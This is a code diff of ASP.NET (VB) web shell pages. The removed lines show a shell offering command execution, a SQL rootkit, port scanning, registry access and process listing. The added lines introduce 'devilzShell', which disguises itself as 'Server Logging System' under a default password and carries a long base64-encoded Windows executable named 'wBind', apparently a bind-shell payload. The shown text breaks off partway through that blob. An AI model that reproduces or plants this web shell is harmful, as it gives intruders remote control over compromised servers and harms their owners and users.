-Protected Sub btnScan_Click(ByVal sender As Object, ByVal e As EventArgs)
-If txtStartIP.Text = "" OrElse txtEndIP.Text = "" OrElse txtPorts.Text = "" Then
-Response.Write("IP OR Ports Error.Check")
-Return
-End If
-Dim StartIp As String = txtStartIP.Text
-Dim EndIp As String = txtEndIP.Text
-Dim ips As ArrayList = MakeIps(StartIp, EndIp)
-Dim ScanPorts As New ArrayList()
-Dim ports As String() = txtPorts.Text.Split(","C)
-For Each port As String In ports
-'Response.Write(port);
-ScanPorts.Add(port)
-Next
-lstRet.Visible = True
-Label1.Visible = True
-Dim myscanner As New Scanner()
-myscanner.Ips = ips
-myscanner.ports = ScanPorts
-myscanner.ret = Me.lstRet
-myscanner.run()
-End Sub
-
-Protected Sub btnReset_Click(ByVal sender As Object, ByVal e As EventArgs)
-txtStartIP.Text = ""
-txtEndIP.Text = ""
-txtPorts.Text = ""
-Label1.Visible = False
-lstRet.Visible = False
-End Sub
-'End Scanner
-</script>
 <%
-if request.QueryString("action")="down" and session("rooot")=1 then
-		downTheFile(request.QueryString("src"))
-		response.End()
-end if
-Dim act as string = request.QueryString("action")
-if act="cmd" then 
-TITLE="CMD.NET"
-elseif act="cmdw32" then 
-TITLE="ASP.NET W32 Shell"
-elseif act="cmdwsh" then 
-TITLE="ASP.NET WSH Shell"
-elseif act="sqlrootkit" then 
-TITLE="SqlRootKit.NET"
-elseif act="clonetime" then 
-TITLE="Clone Time"
-elseif act="information" then 
-TITLE="Web Server Info"
-elseif act="goto" then 
-TITLE="K-Shell 1.2"
-elseif act="pro1" then 
-TITLE="List processes from server"
-elseif act="pro2" then 
-TITLE="List processes from server"
-elseif act="user" then 
-TITLE="List User Accounts"
-elseif act="applog" then 
-TITLE="List Application Event Log Entries"
-elseif act="syslog" then 
-TITLE="List System Event Log Entries"
-elseif act="auser" then 
-TITLE="IIS List Anonymous' User details"
-elseif act="sqlman" then 
-TITLE="MSSQL Management"
-elseif act="scan" then 
-TITLE="Port Scanner"
-elseif act="iisspy" then 
-TITLE="IIS Spy"
-elseif act="sqltool" then 
-TITLE="SQL Tool"
-elseif act="regshell" then 
-TITLE="Registry Shell"
-else 
-TITLE=request.ServerVariables("HTTP_HOST") 
-end if
+'#
+'# devilzShell <[aspx]>
+'# ^^^^^^^^^^^^
+'# author: b374k
+'# greets: devilzc0der(s) and all of you who love peace and freedom
+'#
+'#
+'# ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+'# Jayalah Indonesiaku
 %>
-<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<script runat="server">
+'################# VARIABLES GOES HERE #######################=============================================]
+Dim shell_name As String = "devilzShell"
+Dim shell_fake_name As String = "Server Logging System"
+Dim shell_title As String = " :: " & shell_name & " ::"
+Dim shell_version As String = "v1"
+Dim shell_password As String = "admin"
+Dim shell_fav_port As String = "12345"
+Dim shell_color As String = "#374374"
+</script>
+
+<%@ Page Language="VB" Debug="true" trace="false" validateRequest="false" EnableViewStateMac="false" EnableViewState="true"%>
+<%@ import Namespace="System.IO"%>
+<%@ import Namespace="System.Diagnostics"%>
+<%@ import Namespace="Microsoft.Win32"%>
+<%@ import Namespace="System.Net.Sockets" %>
+<%@ import Namespace="System.Net" %>
+<%@ import Namespace="System.Runtime.InteropServices"%>
+<%@ import Namespace="System.Text.RegularExpressions"%>
+<%@ Import Namespace="System.Threading"%>
+<script runat="server">
+'################# RESOURCES GOES HERE #######################=============================================]
+    Dim icon As String = "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAB/klEQVR42o2RS2gUQRCGq7rHB0rw" & _
+    "4miwFWVmPSmIHpaQSwQD4ivGKHsImIOyBhJETUDjRaMIEjTk4gNFIutBwScY8eBh9aBgyCGCiKu4" & _
+    "E4kzBk0uimiI21XWwgbMorOppumuKuqr6r8RZmnjxl8iR0H2DzfKT03HsVLhV+Ove4rc8xk4uYtx" & _
+    "dCHgGQHc/SdAuqwZB9jCAE7RnwLGR8hHbiK5/aQzCcC0FP/+u2YG4KPx2+p14SKVTbFIiPdI7/ei" & _
+    "oL98whmAt8bv3O7Y89sIv29kzOpSvENR41lSD1Jh0BQLeGf8jq3a9nayetX2KVhfeta8Gm0nuwgH" & _
+    "0+FITSxgzPgtm3Qhs5qR+kgfqwIYGgVuTmk60EPq/p4w2B0LkG5+l7I5Ud3BUsoBBlc0uEVOakWU" & _
+    "vxMLKNqA8V4c0rZWyZ0lzbI2M9rTpNfKD+RiAV+MX9eiCs9+yV2ecLkacPgaUvcNxcuuWHW9Pgr2" & _
+    "xQJeGu9Us7YnjpMaFsE2FGOh8dN12l49SjjUGo4kYwE54x3eqW3fXlJjrawSMvLPN8brbtB08hyp" & _
+    "gaYwaIgFTJjE0l5l3wfAVRdIN4qQT8T/dht5btbq9pVR/lJFEUWHWhF9fnWUzxb9x8u9hwcV7ZjO" & _
+    "D1rHXRx9mPgvoNxkqjmTwKnXyMlVgAtcxucCyMwaUMn+AMvLzBHNivq3AAAAAElFTkSuQmCC"
+    Dim bg As String = "iVBORw0KGgoAAAANSUhEUgAAAAMAAAADCAYAAABWKLW/AAAAJklEQVR42mNkAAIpKan/b968YWAE" & _
+    "MZ49ewamGdnY2P6LiIgwgAQA8xYNYheotNcAAAAASUVORK5CYII="
+    Dim wBind As String = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _
+    "AAAAyAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1v" & _
+    "ZGUuDQ0KJAAAAAAAAAA0GAk5cHlnanB5Z2pweWdqmGZsanF5Z2rzZWlqenlnanB5ZmpNeWdqEmZ0" & _
+    "and5Z2qYZm1qanlnalJpY2hweWdqAAAAAAAAAABQRQAATAEDAIkLlD8AAAAAAAAAAOAADwELAQYA" & _
+    "ADAAAAAQAAAAQAAAYHIAAABQAAAAgAAAAABAAAAQAAAAAgAABAAAAAAAAAAEAAAAAAAAAACQAAAA" & _
+    "EAAAAAAAAAIAAAAAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAACAAAAIAQAAAAAAAAAA" & _
+    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _
+    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFVQWDAAAAAA" & _
+    "AEAAAAAQAAAAAAAAAAQAAAAAAAAAAAAAAAAAAIAAAOBVUFgxAAAAAAAwAAAAUAAAACQAAAAEAAAA" & _
+    "AAAAAAAAAAAAAABAAADgVVBYMgAAAAAAEAAAAIAAAAACAAAAKAAAAAAAAAAAAAAAAAAAQAAAwAAA" & _
+    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _
+    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _
+    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _
+    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _
+    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _
+    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _
+    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _
+    "AAAAAAAAAAAAAAAAAAAAAAAAMy4wNABVUFghDQkCCbOeYU01Vb5H61QAAFUiAAAAYAAAJgMADCfk" & _
+    "//+DfCQEBXUIagD/FTBAQADCBACQuCx03/7/EgAA6AMABSxTVVZXaAAQI2gwUEAuHN1v396L0LkH" & _
+    "HgAzwI1GPPOruAQMv/aX3bsQBIlEJEADRI08M9tQUokf9naz/USJXCRQNgyheFYEvvdlJ/6v+/+D" & _
+    "+AGJdCQUfhyLDYQTUWkXg8QEZjvDbHf/7j4UdQQdjZQkrFNSagI+9Hb/ut+FwA+FQwI8PUcDfX5T" & _
+    "AGoB+777+x7olPA78zYYD4QeAptTSa3puq4ggBQHJAMoLCp7vm2b8GbHChwki0wkFFFA7U33Z+xU" & _
+    "JBBmvR4cUlBWdZDucpDczQFqChDkXjfsZryLLUTTThD+W/7t1taVIItuGI1MJBCNVFFG/vYgW5zg" & _
+    "dNPp5gIQaBAnABbOZhpHQP2IVNAbbt1HO9N0sJMQu4vxWSzBu///wukCXIvOg+ED86oPv0oKi1IM" & _
+    "i8EYMIvK956/Mhqli8ikxtEshG8IwckYzUYd6V67sBlO/wDm4Sxb5wYZ2DUYtFhA1d13lw12PAJo" & _
+    "BONSx4QkjNgBzn54cwtMnCSQ47QkmAacHtt8T6AAzzyNvDqDyf/G7nfcwmhQLvKu99FJiZ/GhACa" & _
+    "pum6GVwHRWVBY2marmlGeB9CbUfTme8GQwdkiJwMSA5E94s9Wy5mOIR6r1BR6bZN11oQ6wW2XFNS" & _
+    "1DSD6QpHdQ4A4dR3HP+QbgFFC8xfXl1bgcTj4Y5HNvkIg+wQ6DPtV8oKl7vH6AcUIBCJbM0U/mbr" & _
+    "Axw8TGg/AA8AVVVMRmr/LFQE+Dv9dHl/GldeePfZEwgdAAU7xXQF+tPrWfvdtNkUSD0kInVMVQBW" & _
+    "VZcOc7ddMv8BSWg4NzwQs22lf+iF7XQjlQFVTRQLbtvONQzWINa0Vltxc41LJRDCa6ldiS3t9mbJ" & _
+    "fHgBOT1sUgp+ESDvfnf6agiKBlBPKQjrEIsVYF4zyYoOj/Hf/YoESoPgCJgDRuvQgD4AdGa7iTSF" & _
+    "1n57u4AGQKMMOkY8InUYBgWy7X//dAtGhMB0Qgp19UbGBgA1mmUeO8lmyQ5RD6Fk0ooW+q0dWVB1" & _
+    "zh8/yXQC68tXOGloBxCUGAcANjrM3FIA+MfOzIDyH2v6ZYurg8cBfg8PtgdqCNle6X1ZWesOLGTF" & _
+    "QQr/9rKFwEfr0hU3R4P+LYvubGGt19oGKzUPdkMsZw/7DGoEVkALoTxwBP32798NjQSbjVxG0DDr" & _
+    "z4P9QsN1AvfYyb7b+pLD/0MENgSMWcPMAB0fo8BRPQJxCHIUgUIVv/2x3z4tEIUBF3PsK8iLxAyL" & _
+    "4YsIi+H/jYVAAsMh7FGLRQiNSAGB+QCfsHR7tncMvQ+3vutSt1b//+2v1w7B+QiB0fZEVgGAXnQO" & _
+    "gGX+AIhN/I3LduOIRf0g6wkN/UX82rXtj/ZYjU0KBRNRUI0QUAvfbrjQnQdmxBxOAsnDU0UKI0Wy" & _
+    "Y4HfDMl0av+qQVKUIuHGe/dkoQAAUGSJJQfgWFNi8SNceIll6Il0QKvUiRX4VNt3n95hyIHh/8gN" & _
+    "9A3B4QgDygrw3A+7P+gQo+wHM/ZFEVpZbrs3ug0wHAsG1ol1/AgPr+y79kkWoxhaBA8OfaPQVAls" & _
+    "22Z3DDAEC3cImSvQt6T3/zMNCEQWH4lFnPZF0AF0Brs0vS1w1OsDWlgddZxWoXALv2XXUCMDDKAI" & _
+    "CMZH7GVD6Q1VCYlNmOzOCZs2F77dw4vHdZge1+3YVHUFWO0g7A0TaLwToQmVbAhz5XhSLyRZJXhL" & _
+    "OBEC7ADu7jYbxAiLC8gFDHUJDwT34dv43TqrUwWL2B33ZK0DCZzgLjCE01safxh8eHKEGKHcU9s7" & _
+    "NdgsbHA+zeReVhF7f6TOM/yAInQEi8brHRsY+WSDZwxTiHyEzgAtvMG7AlijQ2wCdSQcHGVbMN1J" & _
+    "BaFEvBEUAhDYMSuVDDkzqQiHt18LmGzglCRdGBmhVGObbU/0RY1TLEEg+InW0HQbwFRAhBg3wb/x" & _
+    "b18f4FZ0Y4ld/I08IceDwAMkdmEXi/wNwIv00NxXzDhKy46FFPwMW6PBxkY7kdQqg7//ydrs1ukp" & _
+    "SeBWXxxVPHOtc1IRFNeg7esCnYULXUNlbU3wJg2JCG8sgVvIoRRaCNgH80Bh0BohCPquIV+DgZQO" & _
+    "AD5ndg2nwxjQDI4I6BC5tU3IAVcPX7koVbM9Ond1ERh6LGUGhHBxoSEIDNSLXAmd/d0VpCKIHSAo" & _
+    "PKEQgyI/+98tuAwJVo1x/DvwchOLBpeD7gQ7hnyFvzUic+1e8pQUw5d8N25oIBAchdtbC61nxDp6" & _
+    "iYZwX8MFtSfbdRI7qnMNV8YE61HCtms4yp4IPgrcGFn4N1v7xSBwWAhIChWD+wXlDd0LWYNgCOpY" & _
+    "4wrZg/uNktvMhPauLGEsvbbrY6VNQguLSASDZ4XIHf/NrTT4EAUV/APRVjvKfRWNNPC33e1JK9EE" & _
+    "tYgSgyYCxgxKdfeL3bYOdngEU7eOM8BpxwWfAXv3DINA63A9kBKBXT0B+RmQkYRKPZP5GZCfhTc9" & _
+    "jYIkPY9Onp8BhhE9kgqKay2MnZ2IarXTdAprwH0fWV7rCPpREWOj41lwFPiDyP8xbFko1yi5uFtd" & _
+    "w+RGUS7ufbtGOWjZVrgFdO3r7Rv8n4DADDvGcwQ5EN2NDEleA+xyfL+NFTvBEnSWMwhaeBk4sgAZ" & _
+    "WrHkRDPxkQ4likYBJ002Gy7QIBHAwFCnFVR05vi2lSVa4yENBwo8IHa6rr2VTQwgd/o0KAQP6fUu" & _
+    "LZTZ21MnOR1a29cWrA5bWtAT/yc6An/6SyESPD10AUddGxxZjSL8Tm3wAevorL1hZhqcA25HW3tZ" & _
+    "5zUI9Y7sfwtPCcYHPUE4H3Q5VVc5it2+RUhZRYA/SSJVNLZYtlB5PAYuOzaxb3f8eKxZblkD/Td1" & _
+    "yV3/hEPpt30WdisdC4kejYc2Bl84qWFb1FG9rxi5V74wii2pP7bDqZATKaIYfP44g61ChRhNJ874" & _
+    "vNoGrxV1n6yLDy0N2zag/NiI1KgYtWGTrtahCC8n2zWs1SSGMTVwFEhazuVuZgCco/ylL5hSu7Vt" & _
+    "TBgcFJSDIXJqjlhji0p9VLUgrdVLpYV4dzeDx1MU8gv/woA4m0SKUAFAgPq+KYTSdCUX3rj90vaC" & _
+    "4VdHBHQ9AYX2cIoQHTsy9ogWRkAL1evODASAyNjtLR1GQBzrQx4Ff0vetgRARNr2gxkYiB5e3pq7" & _
+    "RmUgdAkJCAl1zHUDSLY3jjW7Smb/gGUYAE4A+75mlrbgRCsFJwNeeGBmbPEXyLyLVbbCaxffAsfQ" & _
+    "14UiXNH49y3wQEPr95Is9sMBltzaX7hBOX1tDYB4ASKN4x2Lwihh2EpbNwgM7u/2t98YGA+UwokF" & _
+    "0euL00uFkw5DiNpboULXBbFLdfOA30Zr5KcgP1UKij+su9Q2dDoPZ3QuKBniwgkTBgYfGw9AsGtz" & _
+    "AwMVAUCQDbWr3deGMA8Og8cDg/eUmgFDo+H7oOOFDm5JoTSIU7stpEBNNgftwT3AzATV+j3XAS0W" & _
+    "Ie3rKGYWTpZvVPsX6hszsgNzAuIPWoHdbLMOQww/J8JmOR5t0Forc+s7CPv5NnZLnwbyK8YvUE7R" & _
+    "+I5A0h2w0QJdUys0/9c1KVdL+jvrdDIyC41qroFbHFVQuyQlIW2D1L1WDBAnXAmL9sTP1gNWnpjD" & _
+    "61OVTKUSpZO5hbF0PGBD0vZv+3QKQDh7+wT2K8dAalXOUolWWKr7Rrp05WCk9ZyzDpRfPDrxxiCV" & _
+    "w+ww7HCCRIsROmHTpKllMhsVWUAY4DXAsgBaIB6GKfutbNy0cxptBLbGRgUKoSNC7u/S9QgFG+vi" & _
+    "jeGYTh1NDGYJQnXFNen3RQnCbrkLMI3cu/1XYrhKSo0cLnwCdjk1Yz6wzP19Ur8ETI8AOIPS/NjP" & _
+    "f4kHjYh+wXMYgGAIGHuBy0CLD3YIgcF85BVif+bVSXy76waLCfvxL2y80X5Giyr4ZDaKTQD2wQEw" & _
+    "oe6tfgQIdQulsB6lCo2/0MeLz8H4BY1Vy3Qv1HrPIaULiQgviDVe4hvrR0WDw5v+fLpQKPECn+w8" & _
+    "2P/y2HVNOxa3b10ABIG0avZY64jDSPW7HaE7wPVYrKiD/3MXV2b9MFInDCUVPtAGgE4r89YoauoK" & _
+    "A3UK8MW+xG4EBYBDdAN8m/+4Ajwrszao0kTDhXrVUYN3GWgceGRrUHYgVbSj6FjcOjY8hS4e0UoP" & _
+    "POhY6JAD86BySL9YONF7/OdV2Gi02PRYuCEeCC5SXTqL5afujjrbTItBBAaeuB3rvozRdA+tVIkC" & _
+    "uAMQwz7Njv6hi9lq/mi8IYn/NQDFLrogGSBKi3C+sOO2QP7xLjvadCghdosMs4XbVgmpbUgXfLOx" & _
+    "/fbv+3USaAEBLbN9Em7/VAjrw2SPBQjtnONDooznZIu2t+DS94F5BGh1DVEMpTlRmLh7C7EFm4pR" & _
+    "uxSF2woEK3EIqGFLArdGfGtD0GsMWVt371ZD6G/D/TIwWEMwMPfjCPr8i11Yii3ll1hA5NmC5qB1" & _
+    "cIkxReEPCInvsrU+IXN7CMFhulv7l212sY90RVZVjWsQqAtdI7oXul5BC8QzeDwlU14DxrpyEZgd" & _
+    "VgzatWOyFVw2b96PSnznum2PVQw7CDAaizSP66HqHftq9nwcyesVXEOITVbgP10WlLVCb2i8O4sp" & _
+    "i0H2A151yRoQJOGhe60aCrihmfIqinWs3M98UiFo/D6GoThWj2DUy1nwdZzwH/5g14HspIRVCDPJ" & _
+    "uCjY3bTVPjuQC0JBPbgMfPG5hfe3lfHB5gM7lhomHCpJZ5aGbLzocA3X9h66ENeo+nUL8SBsRGLh" & _
+    "hVw+/7kpAOXBukm6MBMX/ENALXF2FiZZEleSvWdvx+IHYUBZZTx2KRlQL3B2FnT4DYNGagMDN7Op" & _
+    "7vho+EFXqCesVWD/xs6SNNwQVwy8zP2QwR3YvP+2LNMWzFSr2REKBCfBL98ZsFkaLF/rJo2Emhor" & _
+    "azBq1zY7TdOk3Qhq9Nx/xF5OTUOAyeQtDEdLpo0mCEfFij8x+apEKf6D+gRyLffZVHRvvv9fE4gH" & _
+    "R0l1+ovIweAIA8EGEMqD4gPXXaIUewPzqzoGIw4o5UxKPs0ixDnJVo0EFWVP3ICuHhaKQ4SIJHVb" & _
+    "0ISBHGZTDglFhgOuq2ohIzvkeCQzUqQB/wUY9poBfvAXLyE1uLQQfXCiFbgi/N5WLJd3/AnSuMgV" & _
+    "OTB0cjBCVFGaYuEN6Nuc99YVIxgkvkBjWb/ggtAWewnT6AGJUMOqcXOjtenkgA+G74B97rG1+NMZ" & _
+    "u03vihEPDK6x9038LLZB/+Q7wg+HkyXHW21ZAw7uUkg/Uux+owEsiwSqjZ7YkYA7v03ob7TLdCyK" & _
+    "UQFkhbb6O8d3t2/3jRTJ/IqSwCAIkEZAE3b1bBu68EFBgDkY1P/cwwid/EGWMC2Ewfz9zG0WHt5Q" & _
+    "o6wLeeTMv8B07P7eD6WlWaO7petVQHn//0g9fWZwGkKhCEA9SnKwbBYrIzksVDbWXmtx+gvCTasA" & _
+    "voLb6OsN2FwKmzCs4KpQ+wTVHUFbangfHpXfgyUhVf4jPMjW6ktc/yV4av0oMHJhFGz85RaxZSdy" & _
+    "GUn1UKmUgameKii0wbY2FwQNbkggdjZTOwG4BOkFEgsgLzzPCBFXbFkzwN4bIdiqtBejxdwbBs76" & _
+    "w18zFKQE7AaMCI1W9+cKFgumfz80wL6HiIQF7KyCxqW6+v5y9IpF8saFDSCpN6Mv4erGjVVgtgra" & _
+    "v3cdKxi0e+zIjbwqQbggAIvZlzb99s/LQkKKQv80ddBfW2qd7PpYa/YagzWNejFWnbFgxFa1I/2y" & _
+    "m032HVYeVjQjKKqwQ1cy/GjvJ39bsBReXD2NcmaLEb+fsMD2wmAW+hCKlAVkiJBO3gqY4L8aAnQQ" & _
+    "IMZbAHdbpqAcgWHCDY08AL/rSRUlf1hju0FyGQRaqkvIgMEgiJOXt7GISR8dYXITencOrm7YmyDp" & _
+    "IOvgTEq+ZeHXgwE6Emr9CJZZ/F+dYHIIWvQDJNCogR+XHw/2VhoWLVg+Zx86Xr0TQMN6HbyxsNdI" & _
+    "fMscJ2qNpCTC/7us4ZH4V/fBA/6KAUG2Ow4S/f//dfGLAbr//v5+A9CD8P8zwoPBBKm/ht9t8IF0" & _
+    "6Jf8JiOE5HQaqUh0gR4d6Kmno82Ny8tboz/+BP7rCP3rA/zaGswR9l8ZC0EM/WBvxWSIF0di7usF" & _
+    "iRe+rBCsxWduaYNrN/a2m+EvNITkJ/fCaRIH2Qm0sWrHOC5mCLYlK9HG7gwIiAcjw9kIuHAqWsUb" & _
+    "9eiu/rHgdyIObTo6u23adRZkmJ6DFdoTKvneRbsbOEJYNcANdwtWGiJlqBRNPRwuA3ByCS/U/8rm" & _
+    "8FZqZEE4xAYAX16I0JCTFEAA5KS5SGMyJBNJtke4QbUrwcMJ/qbZZJL9/IbGoNBStFfFnU1SttEL" & _
+    "FMEQ0QPG1HbUMI3t+PgPgnhH98eMFIrQ/0I4kd9yKfOl/ySV6CwWKvDbYse6HIPpSMrgczO3JYjI" & _
+    "F4UABo34Tdc9XZAHfBAEPANgI7a3wMHRiszXiEcBBQIZW7bmVghZxsdczJaxZSeNSSslAQI7m+RZ" & _
+    "AqaQI0YhrjuQr0c/jN8GzAOapmmaxLy0rKScNN1C/79EjuSJl+QH6OjTNE3T7Ozw8PQC0zRN9Pj4" & _
+    "/BBafNgojZoD8HoJwDTb7//wAC0DDCAN7C3tWF5foJCdCwnBBZv5EaMN4e3DDAorjXQxZ3w5/H92" & _
+    "20sGJA394/x3gC7CeWtxRe+NMC6PF/mcTPkriC0swma67pCYC7gD4G0DOlvydbdvA05YT1a2S90u" & _
+    "Ydgfo+4C7wK8ZQPyKYyQJySNV7Ykqy0DrkXXXZiBWmBbNAY8A03TNE1ETFRcZHdpmmaELpccHBgY" & _
+    "pmmaphQUEBAMkKZpmgwICAQETdedsB+QBZgDqLwlOLeELpe3tYcDWwizD4MTIZlOCLdoQBnVDLkW" & _
+    "YHK0SFuts50luqwGsAUGwIzEo6iUoLrspd5CeKEY+YChtAfatDVgiLraVJJQDNcL7ZY1ACRyB2MU" & _
+    "6+hfZXIRIaPLnsX2VnKv8/ryK3EMWriD/7/AwvxXwe4Pi86LevxpyQSvS4l92Cjk3jCMAUSZILZN" & _
+    "xrcG3L0ME9UI+HV/wRGjQnz7aj9JXwsMO892qZELBXq7EwQ7Awh1SL2lIP+tf+hzHL9x0++NTAGO" & _
+    "1yF8sET+CXUu2Na7K3UhOeskdeAeLX0692AhvLDEEiQGeQSZsXLBUYd8EwoEje+2G8xd+A0IjIv7" & _
+    "wf8EZHRb29r/P3uGXy+94ZfsFWoAWiTQK6gFun/MEaGJVfhJWjvKpnb2/LmtdfPKQRv7QD47+nbb" & _
+    "UrstmPq/dGsuiVG+UTwyMmC9uurSIVRhwSKXER69LdYS8tIhlExSv1pZzrZJvkoLBAgRFS5s1JEn" & _
+    "7NUJOTOGfDMbpIkp8I0M+crWXPcLJokvDgUIol1q2ZdKY4cHBO/bRrtfzU0P/sGIC3Ml8w9GDnay" & _
+    "3b+7iIvP0+t2CRkNjUSxxW4V+wkY6ykkwE/gGWOH4J4lWQQPnYS3CVT6VsM4i1RFoxqJXBNXhngs" & _
+    "S3L6oXZMWqp8ot9/pFanQBTi9qZqDwNIDFKAAEPMXiN2klNRgB8y/rD3IBwJUAgOOUAQg6SI4uxu" & _
+    "9mwkD/5IQwpI6rE33OJ5QxODYAT+EYN4CLrXNt1DbFMQcAxaEgkQLXosLGD0D9hC4RjyBICSy8go" & _
+    "+sW/ofNMEexRjUgUUZsrHOP9dmVizv8NLzsFIjVPv7ZRtxSWOokNTOsidX5Pt6OsiTU1XClgkypm" & _
+    "L2gbn9yNYDyCLBtIF3bw/Ds6TBdqSTR9DoPO/9PugynHWy3t/+/06xAmgP+2wL0z9tPoDgOhaYvY" & _
+    "O99/u/AbfwhzGYtL4TsjKyP+C891C7td41Y+FDuaGHLnB3V520zI94vaO9gmFQXr5hklukV3dVkk" & _
+    "c7N7CEh3yLNzEzfr7SYNG7dfmbMv7hclbnuF23YXtDAWCCYfWVstbFut/IBDqDhsB91r1W0b6SNp" & _
+    "WqUUi8NbqW0W+sdKLYuMkLY7e9ilgJBEiDeLEnAR9gtvZVXdg2X8hEhEC9aLCwEMtdB1B5FJFKb/" & _
+    "LlwcX4v+IzkL13Tpi5cbhzXryjP/XFhNdkz/7mB3V851DWZqIGRfhcl8BdHhR66u2+7r94sgVPlD" & _
+    "Cit/8XuNRk3/wf4EToP+P374Xjeb0qaTzA0BJGEgfSsRt6UOAu84nNPz7CM3ynH3XIhEiQP+D3Xq" & _
+    "Yewh0WID6QvrMRcrlSu4douhMiEZKTaYLCbnKASFIgrArk2vy3oE+ACVr3oIkNt+rmqEoql88UIM" & _
+    "pVkGkFoiwmQG1VLpZv4LfSnEmQsujW2uxxFiv7DOjAk7gN12yQqPCXyu6y8ovg9po+VOtgl7BLG8" & _
+    "cD3Sxa0Wvu4JN2p0uaVfOnQLiQqJA/yyeXVt+G0bvNEiARIy/J+LDnr8VqohJQ8+dRo7HfLQiNSV" & _
+    "60s7pAbSpbpgaxGJUEIECAY9OCkCDW/sMN26wf9ddTBfiVBy4JCWBaW0V5doMIPCBirHdIicDX/B" & _
+    "YsA9CmjEQeAIR7bPTEUwjTSBM2SJRvZBA/0QdCpqBGj/aLJXGfQGMMhgDB12EFe11ICB/N18TqAW" & _
+    "+60kxYl+BP8FYkFwHapdqovGsu7po/WNrktxyEEIM9vFT+vjRrPgQ8M3acCBWvvEdhtjMIJF6kAI" & _
+    "AgTdujVsnEoe+4XB5995DBcw5LOLEIAARQ36TSbRJycVjZcAcCNocGn7+nc8jUd3SPKDiH5mMO/u" & _
+    "9I2I/AbHQPzwQg56n/vt7/+lSATHgOgQFAVW3lE3WCzwlnbHI08MBfjeugLghukmiayNSgyH28vW" & _
+    "CI9BZJ5EQrye41Wq8RYsQ4rIC6BGq1vdeohOQwsJeMIsCjgoMMtofmrPj4rQ2KvkYFZCeJDo4WhE" & _
+    "RDBczWeLNbl42FBBhjhEs9ZhB37P/il0UGgoEGgUB6Nkbnop3uHWo2i8C94W/9BdvWf/PXQOoWgQ" & _
+    "BVMRvhigV6phA0FNjgdWR1zr+I8MV5SsUrv6elZTi9ndFPebTgVvqHEkEG7bdW/rIdbVjii8s3Ql" & _
+    "gSkfN/tfe3XrLR1Rg+MDdA0gHaEOKlQv8CBbNVB6z2jDyXQSOoN30j0DcRE67mwYgAjQNi76Kpgg" & _
+    "I8B292Ov+gYny3LyFoPG3iweDLXCtyN1xjnrGIHixwwt9kjTCQ4ABDPSU+5s97ttVQoEiQdfdfiw" & _
+    "dYWjAjlCMFlQRLWCUuQcVJ8QXAI+f0ZX8ltTZIme4FbUVtaMs5XfRhMdI+siIAxRTwg+G4heIgEI" & _
+    "3mLSWWxcFH4QoHEHRFRdzllZ5WDrotfJHRMdFhy8JQQu2XRIyOb5EHMqOtN9IAQbs3Ygcy5/JKCD" & _
+    "5yVzIP+Lc+RNnIjW14VWGQRgmxCCG3fEQdw2CMGGX+sTcP8mBby1sRGLOGfcdGa6ZG22M9xhIVf0" & _
+    "TS/iLObsGqWMD+1/iRJPRfd0MvZFDQR0QD6zm6m2HHiyQNV/HtrAbG1kMkjSj1C6kIayyMeD8gvZ" & _
+    "XN2zNtyJXeAuVkoyEluyfXfKutbfdM9k5Gd0nI+4zW43s3UEA+sGjChoIPggNmaU1VC/t3ELFKGL" & _
+    "z8Zx0QgAlkrNi0RW/EoNEmywUELsQO1J9NjcEt3zDF7IKx6DwuSCkxaKdH4PODL1OqqBtwSe2eRA" & _
+    "SXBrf2g8y5HPCYA7eDz8O5ACJNh1BLwD4Dt/CDkA8mg8aDw0XTdYP18GTANEPAk2TdM0LCQcPH/u" & _
+    "M4cAaDzwgAMDkASbjKA8fwDnEfKQPrA9CD1IsOt+LJAYCzgDYD1/yCGQVwA+AD66brBQW7R/vAPE" & _
+    "bJqmaczU3OT3PU4IARJ/HxAgwabrBRgDKDw+fxFm+gXM/yXAmgA1anMA/6sWSitBj8wDF00YkwPb" & _
+    "pv6/cnVudGltZSBlcnJvclENCgNUAflv9kxPU1MRDgBTSU5H/rL2AlNPTUESEVI2MDI4t7+83Qgt" & _
+    "IEthYmx0byBpbmlWYWw/3+zbaXoNaGVhcDcnN25vdLZvcGs9BHVn7nNwYWMjZuw2YO97bG93aThh" & _
+    "Bm9uNyB5Crk2c3RkWvvtZzVwdXIrdmlydHUhM77Y9tulYyMgYwxsKF802nabQl8qZXhcL1iwk732" & _
+    "BtziXzE599vu5r5vcGVYMXNvD2Rlc2NrbTJgKzhGJIHfQIhwZWQZVyM3dms0JG2brHRovyGM5Nth" & _
+    "L2xvY2sXmtsGWzRkt2EuAvat4daiIXJtAHBAZ3JhbSB7IRS2Sm02LzA5T6MZWgoQQSorFPK5RjAu" & _
